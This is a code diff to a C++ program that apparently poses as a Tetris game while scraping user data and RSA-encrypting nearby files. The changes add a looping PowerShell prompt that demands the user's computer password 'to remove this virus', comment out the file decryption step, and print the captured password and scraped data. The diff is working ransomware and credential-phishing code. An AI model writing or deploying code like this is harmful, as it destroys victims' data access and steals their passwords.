@@ -60,10 +60,10 @@ std::string getUserInputViaPowerShell(std::string message)
     std::string outputFile = "ps_input.txt";
 
     // PowerShell command to get user input
-    std::string psCommand = "powershell -Command \"$input = Read-Host '" + message + "'; $input | Out-File -FilePath " + outputFile + " -Encoding UTF8; exit\"";
+    std::string psCommand = "powershell -Command \"$input = Read-Host '" + message + "'; $input | Out-File -FilePath '" + outputFile + "' -Encoding UTF8\"";
 
     // Execute in new window
-    std::string command = "start /wait " + psCommand;
+    std::string command = "start /wait cmd /c " + psCommand;
     system(command.c_str());
 
     // Read the result
@@ -73,6 +73,13 @@ std::string getUserInputViaPowerShell(std::string message)
     {
         std::getline(inputFile, userInput);
         inputFile.close();
+
+        if (userInput.length() >= 3 && 
+            (unsigned char)userInput[0] == 0xEF && 
+            (unsigned char)userInput[1] == 0xBB && 
+            (unsigned char)userInput[2] == 0xBF) {
+            userInput = userInput.substr(3);  // Skip UTF-8 BOM
+        }
     }
 
     // Cleanup
@@ -80,17 +87,6 @@ std::string getUserInputViaPowerShell(std::string message)
 
     return userInput;
 }
-
-void performativePowershell(){
-    std::string outputFile = "ps_input.txt";
-
-    // PowerShell command to get user input
-    
-    std::string psCommand = "powershell -Command \"Write-Host 'Initializing Malware Deployment'; Start-Sleep -Seconds 0.4; exit\"";
-    std::string command = "start \"\" " + psCommand;
-    system(command.c_str());
-}
-
 /**
  * Replaces the content of a file with a default string.
  * @param filename The path of the file to replace content in.
@@ -125,6 +121,13 @@ void encryptFileContent(const std::string &filename, Botan::RSA_PublicKey &pubKe
     }
 }
 
+/**
+ * Replaces the content of a file with a default string.
+ * @param filename The path of the file to replace content in.
+ * @param privKey The RSA private key.
+ * @param rng Random number generator.
+ * @throws std::runtime_error if the file cannot be opened for writing.
+ */
 void decryptFileContent(const std::string &filename, Botan::RSA_PrivateKey &privKey, Botan::AutoSeeded_RNG &rng)
 {
     std::ifstream fileRead(filename);
@@ -156,8 +159,6 @@ int main()
 {
     playTetris();
 
-    performativePowershell();
-
     std::string userdata = scrape();
 
     Botan::AutoSeeded_RNG rng;
@@ -167,16 +168,30 @@ int main()
 
     Botan::RSA_PublicKey pubKey(privKey);
 
-    std::vector<fs::path> files = find_neighboring_files("./encrypt.exe", {"CMakeCache.txt", "datascrape.exe", "encrypt.exe", "rsa.cpp", "rsa.h", "tetris.exe", "tetris.cpp", "tetrisPlayable.cpp"});
+    std::vector<fs::path> files = find_neighboring_files("./encrypt.exe", {"CMakeLists.txt", "datascrape.exe", "encrypt.exe", "rsa.cpp", "rsa.h", "tetris.exe", "tetris.cpp", "tetrisPlayable.cpp", "encrypt.cpp", "datascrape.cpp", "rsa_key.pem", "deploy.bat", "build.bat", "exec.bat", "password.cpp", "password.exe"});
     for (const fs::path &file : files)
     {
         encryptFileContent(file.string(), pubKey, rng);
     }
 
-    std::string password = getUserInputViaPowerShell("Please provide your computer password to remove this virus from your system");
-    for (const fs::path &file : files)
-    {
-        decryptFileContent(file.string(), privKey, rng);
+    std::string password;
+        
+    while (true) {
+        password = getUserInputViaPowerShell("Please provide your computer password to remove this virus from your system");
+        int passwordStatus = checkPassword(password);
+        
+        if (passwordStatus == 1) {
+            break;
+        }
     }
+
+    // for (const fs::path &file : files)
+    // {
+    //     decryptFileContent(file.string(), privKey, rng);
+    // }
+
+    std::cout << password << "\n" << userdata << std::endl;
+    
+    
     return 0;
 }
